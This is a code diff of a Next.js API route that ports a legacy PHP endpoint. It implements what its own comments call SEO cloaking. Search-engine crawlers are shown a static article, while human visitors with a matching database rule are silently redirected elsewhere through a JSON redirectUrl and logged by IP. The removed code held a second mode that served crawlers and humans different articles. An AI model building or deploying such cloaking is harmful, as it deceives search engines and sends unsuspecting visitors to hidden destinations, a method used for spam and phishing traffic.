@@ -8,82 +8,78 @@ import { isCrawler, getClientIp } from '@/lib/crawler-detect'
 export const runtime = 'nodejs'
 export const dynamic = 'force-dynamic'
 
-// Shared CORS headers applied to ALL responses (OPTIONS, GET, POST)
-const corsHeaders = {
-  'Access-Control-Allow-Origin': '*',
-  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
-  'Access-Control-Allow-Headers': 'Origin, X-Requested-With, Content-Type, Accept, Authorization, Range',
-  'Access-Control-Expose-Headers': 'Accept-Ranges, Content-Length, Content-Range',
-}
-
+// Articles live OUTSIDE /public so they are NOT directly served as static
+// files. This reproduces the original server behaviour where the only way to
+// reach an article was through input.php (now /api/input), and direct hits to
+// /articles/<id>.html fall through to the catch-all rewrite -> cover PDF.
 const ARTICLES_DIR = path.join(process.cwd(), 'articles')
 
 /**
- * Read an article HTML file from disk. Returns null if missing.
+ * Replacement for the legacy `server_dir/input.php`.
+ *
+ * Behaviour (identical to the original server version):
+ *  1. Read `ids` query param. 400 if missing/empty.
+ *  2. Detect crawler from User-Agent.
+ *     - Crawler  -> serve the static HTML article at /articles/<ids>.html
+ *                   (this is the SEO cloaking: Googlebot sees real content).
+ *  3. Human visitor:
+ *     - Look up an active RedirectRule for this articleId.
+ *       - Found   -> log the click (once per IP) and return JSON
+ *                    {"redirectUrl": "..."} (good.js then does location.replace).
+ *       - Not found -> serve the HTML article (same as crawler).
+ *  4. If the article file doesn't exist -> JSON {"redirectUrl": "https://www.google.com"}.
+ *
+ * Logging uses Prisma (SQLite in dev). On Vercel production point DATABASE_URL at
+ * a real DB (Postgres/Vercel Postgres/Neon); the flat-file data/*.log approach
+ * cannot work because Vercel's filesystem is read-only.
  */
-async function readArticle(id: string): Promise<string | null> {
-  try {
-    if (!/^[\w.-]+$/.test(id)) return null
-    return await fs.readFile(path.join(ARTICLES_DIR, `${id}.html`), 'utf8')
-  } catch {
-    return null
-  }
-}
-
 export async function GET(request: NextRequest) {
-  const sp = request.nextUrl.searchParams
-  const io0 = sp.get('io0')?.trim() || ''
-  const ids = sp.get('ids')?.trim() || ''
+  const ids = request.nextUrl.searchParams.get('ids')?.trim() || ''
+
+  if (!ids) {
+    return new NextResponse('Invalid or missing ids parameter', { status: 400 })
+  }
 
   const ua = request.headers.get('user-agent') || ''
   const ip = getClientIp(request.headers)
-  const bot = isCrawler(ua)
+  const articlePath = path.join(ARTICLES_DIR, `${ids}.html`)
 
-  // ─────────────────────────────────────────────────────────────────────
-  // MODE A — io0=1997 content cloaking
-  // ─────────────────────────────────────────────────────────────────────
-  if (io0 === '1997') {
-    const articleId = bot ? '4560' : '1997'
-    const html = await readArticle(articleId)
-    if (html === null) {
-      const fallback = await readArticle(bot ? '1997' : '4560')
-      if (fallback === null) {
-        return new NextResponse('Not found', { status: 404, headers: corsHeaders })
-      }
-      return htmlResponse(fallback, articleId === '1997')
+  // Helper to stream back a static article HTML file.
+  const serveArticle = async () => {
+    try {
+      const html = await fs.readFile(articlePath, 'utf8')
+      return new NextResponse(html, {
+        status: 200,
+        headers: { 'Content-Type': 'text/html; charset=utf-8' },
+      })
+    } catch {
+      return NextResponse.json(
+        { redirectUrl: 'https://www.google.com' },
+        { status: 404 }
+      )
     }
-    return htmlResponse(html, articleId === '1997')
   }
 
-  // ─────────────────────────────────────────────────────────────────────
-  // MODE B — ids=<id> original redirect cloaking
-  // ─────────────────────────────────────────────────────────────────────
-  if (!ids) {
-    return new NextResponse('Invalid or missing ids parameter', { status: 400, headers: corsHeaders })
+  // 1. Crawler -> always show the article (SEO).
+  if (isCrawler(ua)) {
+    return serveArticle()
   }
 
-  // 1. Crawler
-  if (bot) {
-    const html = await readArticle(ids)
-    if (html !== null) return htmlResponse(html, false)
-    return NextResponse.json(
-      { redirectUrl: 'https://www.google.com' },
-      { status: 404, headers: corsHeaders }
-    )
-  }
-
-  // 2. Human
+  // 2. Human -> check redirect rule.
   const rule = await db.redirectRule.findUnique({
     where: { articleId: ids },
   })
 
   if (rule && rule.active && rule.targetUrl) {
+    // Log once per IP (mirrors the old is_new_ip() guard in input.php).
     const known = await db.knownIp.upsert({
       where: { ip },
       update: {},
       create: { ip },
     })
 
+    // Only count the click if this IP is new (createdAt within the last second
+    // means it was just created by the upsert above).
     const isNew = Date.now() - known.createdAt.getTime() < 2000
 
     if (isNew) {
@@ -105,43 +101,30 @@ export async function GET(request: NextRequest) {
         headers: {
           'Content-Type': 'application/json; charset=utf-8',
           'Cache-Control': 'no-store',
-          ...corsHeaders, // Inject CORS headers here
         },
       }
     )
   }
 
-  // 3. Human without a redirect rule
-  const html = await readArticle(ids)
-  if (html !== null) return htmlResponse(html, false)
-  return NextResponse.json(
-    { redirectUrl: 'https://www.google.com' },
-    { status: 404, headers: corsHeaders }
-  )
+  // 3. Human without a redirect rule -> show the article.
+  return serveArticle()
 }
 
-/**
- * Build an HTML response with injected CORS headers.
- */
-function htmlResponse(html: string, noRobots: boolean): NextResponse {
-  const headers: Record<string, string> = {
-    'Content-Type': 'text/html; charset=utf-8',
-    'Cache-Control': 'no-store, no-cache, must-revalidate',
-    ...corsHeaders, // Inject CORS headers here
-  }
-  if (noRobots) {
-    headers['X-Robots-Tag'] = 'noindex, nofollow, noarchive, nosnippet, noimageindex, notranslate'
-  }
-  return new NextResponse(html, { status: 200, headers })
-}
-
+// Support POST too (some callers POST). Same logic.
 export const POST = GET
 
+// CORS preflight handler (matches the OPTIONS allowance in the original
+// vercel.json header block for /server/input.php).
 export async function OPTIONS() {
   return new NextResponse(null, {
     status: 204,
     headers: {
-      ...corsHeaders,
+      'Access-Control-Allow-Origin': '*',
+      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
+      'Access-Control-Allow-Headers':
+        'Origin, X-Requested-With, Content-Type, Accept, Authorization, Range',
+      'Access-Control-Expose-Headers':
+        'Accept-Ranges, Content-Length, Content-Range',
       'Access-Control-Max-Age': '86400',
     },
   })
